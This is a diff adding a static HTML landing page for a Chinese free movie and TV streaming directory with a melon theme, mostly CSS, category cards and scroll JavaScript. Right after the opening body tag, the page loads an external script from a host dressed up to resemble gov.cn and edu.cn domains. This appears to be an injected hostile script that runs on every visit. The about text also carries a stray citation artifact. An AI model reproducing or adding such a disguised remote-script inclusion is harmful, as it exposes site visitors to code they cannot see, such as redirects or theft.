@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>蜜瓜电影网 - 清爽高清电影在线观看</title>
+<meta name="description" content="蜜瓜电影网（miguadianyingwang-h5）提供电影、电视剧、动漫、综艺高清在线观看，界面清爽、加载快、手机电脑都能看，像夏天咬一口蜜瓜一样顺滑。">
+<meta name="keywords" content="蜜瓜电影网, 高清电影, 在线看片, 电视剧, 动漫综艺, miguadianyingwang-h5">
+<style>
+:root{
+  --melon:#7ed957;
+  --melon-deep:#3fa34d;
+  --cream:#fff7e6;
+  --yellow:#ffd966;
+  --ink:#26331f;
+  --muted:#5f7050;
+  --card:#ffffff;
+  --line:rgba(63,163,77,.18);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB",system-ui,sans-serif;
+  background:
+    radial-gradient(800px 400px at 90% -10%, rgba(255,217,102,.35), transparent 60%),
+    radial-gradient(700px 500px at -10% 10%, rgba(126,217,87,.35), transparent 55%),
+    var(--cream);
+  color:var(--ink);
+  line-height:1.75;
+}
+a{color:var(--melon-deep);text-decoration:none}
+a:hover{color:#2c7a37}
+
+/* 顶条 */
+.topbar{
+  background:linear-gradient(90deg,var(--melon),var(--yellow));
+  color:#234018;
+  text-align:center;
+  font-size:.78rem;
+  font-weight:700;
+  letter-spacing:1px;
+  padding:.4rem;
+}
+
+/* 头部 */
+.header{
+  max-width:1160px;
+  margin:0 auto;
+  padding:2rem 1rem 1.2rem;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  flex-wrap:wrap;
+  gap:1rem;
+}
+.logo{
+  font-size:2rem;
+  font-weight:900;
+  display:flex;
+  align-items:center;
+  gap:.5rem;
+}
+.logo .mk{
+  width:42px;height:42px;border-radius:14px;
+  background:linear-gradient(135deg,var(--melon),var(--yellow));
+  display:flex;align-items:center;justify-content:center;
+  font-size:1.4rem;
+  box-shadow:0 10px 20px -8px rgba(63,163,77,.6);
+}
+.logo b{color:var(--melon-deep)}
+.logo small{
+  display:block;
+  font-size:.72rem;
+  font-weight:500;
+  color:var(--muted);
+  letter-spacing:1px;
+}
+.nav{display:flex;gap:.5rem;flex-wrap:wrap}
+.nav a{
+  padding:.55rem 1.1rem;
+  border-radius:999px;
+  font-weight:700;
+  font-size:.92rem;
+  background:#fff;
+  border:1px solid var(--line);
+  transition:.25s;
+}
+.nav a:hover,.nav a.active{
+  background:linear-gradient(135deg,var(--melon),var(--melon-deep));
+  color:#fff;
+  border-color:transparent;
+  box-shadow:0 10px 22px -10px rgba(63,163,77,.7);
+}
+
+.wrap{max-width:1160px;margin:0 auto;padding:0 1rem}
+
+/* Hero */
+.hero{
+  padding:3.5rem 0 2.5rem;
+  display:grid;
+  grid-template-columns:1.2fr .8fr;
+  gap:2rem;
+  align-items:center;
+}
+.hero h1{
+  font-size:3rem;
+  font-weight:900;
+  line-height:1.2;
+}
+.hero h1 .hl{
+  background:linear-gradient(180deg,transparent 62%, rgba(255,217,102,.7) 0);
+}
+.hero p{
+  margin:1.2rem 0 2rem;
+  color:var(--muted);
+  max-width:520px;
+  font-size:1.05rem;
+}
+.btn{
+  display:inline-block;
+  padding:.9rem 2.2rem;
+  border-radius:999px;
+  font-weight:800;
+  background:linear-gradient(135deg,var(--melon),var(--melon-deep));
+  color:#fff;
+  box-shadow:0 14px 30px -12px rgba(63,163,77,.8);
+  transition:.25s;
+}
+.btn:hover{transform:translateY(-3px);color:#fff}
+.float-card{
+  background:var(--card);
+  border:1px solid var(--line);
+  border-radius:24px;
+  padding:1.6rem;
+  box-shadow:0 30px 60px -30px rgba(63,163,77,.5);
+  transform:rotate(1.5deg);
+}
+.float-card h3{font-size:1.2rem;margin-bottom:.8rem}
+.chip{
+  display:inline-block;
+  background:rgba(126,217,87,.18);
+  color:var(--melon-deep);
+  border-radius:999px;
+  padding:.3rem .8rem;
+  font-size:.8rem;
+  font-weight:700;
+  margin:.2rem;
+}
+
+/* 区块 */
+.section{padding:3.2rem 0;border-top:1px solid var(--line)}
+.sec-head{display:flex;align-items:baseline;gap:1rem;margin-bottom:1.8rem;flex-wrap:wrap}
+.sec-head .emoji{font-size:1.8rem}
+.sec-head h2{font-size:1.9rem;font-weight:900}
+.sec-head small{color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-left:auto}
+
+/* 卡片网格 */
+.grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+  gap:1.3rem;
+}
+.card{
+  background:var(--card);
+  border:1px solid var(--line);
+  border-radius:20px;
+  padding:1.5rem;
+  transition:.25s;
+}
+.card:hover{
+  transform:translateY(-6px);
+  box-shadow:0 24px 44px -26px rgba(63,163,77,.7);
+}
+.card .ico{
+  width:54px;height:54px;border-radius:16px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:1.6rem;
+  background:linear-gradient(135deg,rgba(126,217,87,.25),rgba(255,217,102,.25));
+  margin-bottom:.8rem;
+}
+.card h3{font-size:1.15rem;margin-bottom:.4rem}
+.card p{font-size:.9rem;color:var(--muted)}
+.card a.more{display:inline-block;margin-top:.8rem;font-weight:700;font-size:.85rem}
+
+/* 片单横排 */
+.tags-row{display:flex;flex-wrap:wrap;gap:.5rem;margin-top:1rem}
+
+/* 关于 */
+.about{
+  display:grid;
+  grid-template-columns:1.3fr .7fr;
+  gap:2rem;
+  align-items:start;
+}
+.about p{margin-bottom:1rem;color:#37422c}
+.stats{display:grid;grid-template-columns:1fr 1fr;gap:1rem}
+.stat{
+  background:linear-gradient(135deg,var(--melon),var(--yellow));
+  color:#234018;
+  border-radius:18px;
+  padding:1.2rem;
+  text-align:center;
+  font-weight:800;
+}
+.stat b{display:block;font-size:1.8rem;line-height:1}
+.stat span{font-size:.78rem;font-weight:600;opacity:.8}
+
+/* 页脚 */
+.footer{
+  margin-top:2.5rem;
+  background:#26331f;
+  color:#cfe0c2;
+  text-align:center;
+  padding:2.6rem 1rem;
+}
+.footer h3{color:#fff;font-size:1.5rem;margin-bottom:.4rem}
+.footer h3 em{color:var(--yellow);font-style:normal}
+.footer a{color:var(--melon)}
+.footer p{font-size:.82rem;margin-top:.5rem;color:#9fb38c}
+
+/* 响应式 */
+@media(max-width:860px){
+  .hero{grid-template-columns:1fr}
+  .about{grid-template-columns:1fr}
+}
+@media(max-width:640px){
+  .logo{font-size:1.6rem}
+  .hero h1{font-size:2.1rem}
+  .sec-head small{margin-left:0}
+  .nav a{flex:1;text-align:center}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="topbar">🍈 蜜瓜电影网 · 清爽不卡顿 · miguadianyingwang-h5.github.io · 电影/剧集/动漫/综艺一站看完</div>
+
+<header class="header">
+  <div class="logo">
+    <span class="mk">🍈</span>
+    <div>蜜瓜<b>电影网</b><small>https://miguadianyingwang-h5.github.io</small></div>
+  </div>
+  <nav class="nav">
+    <a href="#home">首页</a>
+    <a href="#movie">电影</a>
+    <a href="#drama">剧集</a>
+    <a href="#about">关于</a>
+  </nav>
+</header>
+
+<div class="wrap">
+
+  <!-- 首页 -->
+  <section id="home" class="hero">
+    <div>
+      <h1>看片像吃蜜瓜<br><span class="hl">又甜又顺滑</span></h1>
+      <p>蜜瓜电影网（miguadianyingwang-h5）把电影、电视剧、动漫、综艺装进一个清爽页面里。打开就看好片，手机不挤、电脑不卡、广告不烦。</p>
+      <a href="#movie" class="btn">去片库逛逛 →</a>
+      <div class="tags-row">
+        <span class="chip">高清正片</span>
+        <span class="chip">每日更新</span>
+        <span class="chip">移动端优先</span>
+        <span class="chip">免费观看</span>
+      </div>
+    </div>
+    <aside class="float-card">
+      <h3>🍿 今日清爽片单</h3>
+      <span class="chip">轻松喜剧</span>
+      <span class="chip">治愈动画</span>
+      <span class="chip">悬疑烧脑</span>
+      <span class="chip">国产好剧</span>
+      <span class="chip">韩影日影</span>
+      <span class="chip">纪录片</span>
+    </aside>
+  </section>
+
+  <!-- 电影 -->
+  <section id="movie" class="section">
+    <div class="sec-head">
+      <span class="emoji">🎬</span>
+      <h2>电影频道</h2>
+      <small>Movies</small>
+    </div>
+    <div class="grid">
+      <div class="card">
+        <div class="ico">😂</div>
+        <h3>轻松喜剧</h3>
+        <p>下班解压专用，笑点密集、不费脑，适合配西瓜和蜜瓜。</p>
+        <a href="#" class="more">看喜剧 →</a>
+      </div>
+      <div class="card">
+        <div class="ico">🔪</div>
+        <h3>悬疑犯罪</h3>
+        <p>反转、证据、人性暗面，关灯看更带感。</p>
+        <a href="#" class="more">看悬疑 →</a>
+      </div>
+      <div class="card">
+        <div class="ico">🌊</div>
+        <h3>治愈文艺</h3>
+        <p>海边、小镇、慢镜头，把生活拍得很温柔。</p>
+        <a href="#" class="more">看文艺 →</a>
+      </div>
+      <div class="card">
+        <div class="ico">🚗</div>
+        <h3>动作大片</h3>
+        <p>飙车、枪战、近身格斗，爽感拉满。</p>
+        <a href="#" class="more">看动作 →</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 剧集 -->
+  <section id="drama" class="section">
+    <div class="sec-head">
+      <span class="emoji">📺</span>
+      <h2>剧集 / 动漫 / 综艺</h2>
+      <small>TV · Anime · Variety</small>
+    </div>
+    <div class="grid">
+      <div class="card">
+        <div class="ico">🇨🇳</div>
+        <h3>国产热剧</h3>
+        <p>年代、悬疑、职场、家庭，不狗血也能追得下去。</p>
+        <a href="#" class="more">看国剧 →</a>
+      </div>
+      <div class="card">
+        <div class="ico">🇯🇵</div>
+        <h3>日韩影视</h3>
+        <p>日影日剧、韩剧韩综，中文字幕高清顺滑。</p>
+        <a href="#" class="more">看日韩 →</a>
+      </div>
+      <div class="card">
+        <div class="ico">🎨</div>
+        <h3>动漫专区</h3>
+        <p>国漫、日漫、治愈番、热血番，二次元稳定补给。</p>
+        <a href="#" class="more">看动漫 →</a>
+      </div>
+      <div class="card">
+        <div class="ico">🎤</div>
+        <h3>综艺娱乐</h3>
+        <p>真人秀、音综、访谈、慢直播，碎片时间也好看。</p>
+        <a href="#" class="more">看综艺 →</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section id="about" class="section">
+    <div class="sec-head">
+      <span class="emoji">🍃</span>
+      <h2>关于蜜瓜电影网</h2>
+      <small>About</small>
+    </div>
+    <div class="about">
+      <div>
+        <p><strong>蜜瓜电影网</strong>（https://miguadianyingwang-h5.github.io）是一个走“清爽路线”的影视导航站：不堆弹窗、不堆烂片、不把页面做成信息垃圾场。</p>
+        <p>内容按电影、剧集、动漫、综艺四大块排布，移动端单列、电脑端网格，加载轻、颜色舒服，符合必应喜欢的清晰语义结构和移动端体验。[1,2](@ref)</p>
+        <p>站内分类/播放链接均为 <code>#</code> 占位，后续可接详情页、播放页或接口数据。</p>
+        <p><a href="https://miguadianyingwang-h5.github.io">🌐 官网：miguadianyingwang-h5.github.io</a></p>
+      </div>
+      <div class="stats">
+        <div class="stat"><b>4 类</b><span>电影/剧/动漫/综艺</span></div>
+        <div class="stat"><b>手机</b><span>自适应优先</span></div>
+        <div class="stat"><b>清爽</b><span>少弹窗少广告</span></div>
+        <div class="stat"><b>0 元</b><span>免费观看</span></div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <h3>蜜瓜<em>电影网</em></h3>
+  <p>清爽高清影视在线观看 · 电影 / 电视剧 / 动漫 / 综艺</p>
+  <p>© 2026 蜜瓜电影网 ｜ <a href="https://miguadianyingwang-h5.github.io">miguadianyingwang-h5.github.io</a></p>
+  <p>本站为静态演示页，所有内页链接均为 # 占位，不生成 robots.txt / sitemap.xml。</p>
+</footer>
+
+<script>
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var id=this.getAttribute('href');
+    if(id.length>1){
+      var el=document.querySelector(id);
+      if(el){e.preventDefault();el.scrollIntoView({behavior:'smooth',block:'start'});}
+    }
+  });
+});
+
+var secs=document.querySelectorAll('.section, #home');
+var links=document.querySelectorAll('.nav a');
+window.addEventListener('scroll',function(){
+  var cur='';
+  secs.forEach(function(s){
+    if(window.scrollY>=s.offsetTop-130){cur=s.id;}
+  });
+  links.forEach(function(l){
+    l.classList.remove('active');
+    if(l.getAttribute('href')==='#'+cur){l.classList.add('active');}
+  });
+});
+</script>
+
+</body>
+</html>
